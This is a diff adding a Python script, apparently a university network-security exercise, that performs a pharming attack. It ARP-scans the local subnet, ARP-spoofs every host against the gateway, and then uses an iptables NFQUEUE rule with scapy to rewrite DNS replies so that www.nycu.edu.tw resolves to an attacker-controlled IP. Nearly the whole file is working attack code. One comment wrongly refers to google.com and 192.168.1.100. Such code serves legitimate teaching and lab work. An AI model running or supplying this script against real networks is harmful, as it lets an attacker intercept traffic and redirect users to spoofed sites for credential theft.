@@ -1,0 +1,105 @@
+#!/usr/bin/env python3
+
+from scapy.all import ARP, Ether, IP, UDP, srp, send, DNSRR, DNSQR, DNS
+from netfilterqueue import NetfilterQueue
+import subprocess
+import netifaces
+
+
+def scan_MAC_address(target_ip):
+    arp = ARP(pdst=target_ip)
+    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = ether/arp
+
+    result = srp(packet, timeout=3, verbose=False)[0]
+    clients = {}
+
+    for sent, received in result:
+        clients[received.psrc]= received.hwsrc
+
+    print("Available devices:")
+    print('-'*37)
+    print("IP" + " "*18+"MAC")
+    print('-'*37)
+    for ip, mac in clients.items():
+        print(f"{ip:16}    {mac}")
+
+    return clients
+
+def ARP_spoofing(target_ip, target_mac, spoof_ip):
+    ''' send a packet that modifies the ARP table of the target machine '''
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet, verbose=False)
+
+
+# DNS mapping records: google.com will be redirected to 192.168.1.100
+dns_hosts = {
+    b"www.nycu.edu.tw.": "140.113.207.237"
+}
+
+def process_packet(packet):
+    # convert netfilter queue packet to scapy packet
+    scapy_packet = IP(packet.get_payload())
+    if scapy_packet.haslayer(DNSRR):
+        # check: the packet has a DNS Resource Record (DNS reply)
+        print("[Before]:", scapy_packet.summary())
+        try:
+            scapy_packet = modify_packet(scapy_packet)
+        except IndexError:
+            # not UDP packet, this can be IPerror/UDPerror packets
+            pass
+        print("[After ]:", scapy_packet.summary())
+        print()
+        packet.set_payload(bytes(scapy_packet))
+
+    packet.accept()
+
+def modify_packet(packet):
+    """
+    Modifies the DNS Resource Record packet
+    """
+    # qname: DNS query name
+    qname = packet[DNSQR].qname
+    if qname not in dns_hosts:
+        print("no modification:", qname)
+        return packet
+
+    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
+    packet[DNS].ancount = 1
+    del packet[IP].len
+    del packet[IP].chksum
+    del packet[UDP].len
+    del packet[UDP].chksum
+
+    return packet
+
+def pharm_attack():
+    # TODO:
+    #  DNS spoofing for the NYCU home page: http://www.nycu.edu.tw
+    #  Attacker server IP in the DNS spoofing: 140.113.207.237
+    QUEUE_NUM = 1
+    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM), shell=True)
+    queue = NetfilterQueue()
+    queue.bind(QUEUE_NUM, process_packet)
+    queue.run()
+    # queue.unbind()
+
+
+def main():
+    # ex:
+    # target_ip = '10.0.2.4'
+    # gateway_ip = '10.0.2.1'
+    gateway_ip = netifaces.gateways()[netifaces.AF_INET][0][0]
+    scan_ip = gateway_ip + "/24"
+    # scan_ip = "10.0.2.1/24"
+    # "192.168.1.1/24" is a range from "192.168.1.0" to "192.168.1.255"
+    clients = scan_MAC_address(scan_ip)
+    for target_ip in clients:
+        if target_ip != gateway_ip:
+            ARP_spoofing(target_ip, clients[target_ip], gateway_ip)
+            ARP_spoofing(gateway_ip, clients[gateway_ip], target_ip)
+    print("ARP spoofing done")
+    pharm_attack()
+
+if __name__ == '__main__':
+    main()
